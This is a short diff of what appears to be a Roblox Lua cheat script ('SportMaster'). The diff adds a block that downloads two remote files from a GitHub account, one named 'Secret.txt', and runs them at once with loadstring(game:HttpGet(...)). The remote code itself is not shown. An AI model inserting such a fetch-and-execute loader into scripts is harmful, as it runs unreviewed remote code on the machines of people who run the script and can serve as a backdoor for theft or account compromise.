@@ -1,4 +1,4 @@
--------------SportMaster END-------------------
+
 
 local lp = game:GetService("Players").LocalPlayer
 
@@ -17,7 +17,10 @@ _G.YourClth = false
 _G.Sport_Master = false
 
 
-
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Venograde/Vino/main/Secret.txt"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Venograde/Vino/main/menu.txt"))()
+end)
 
 function getchar()
 	local character = lp.Character
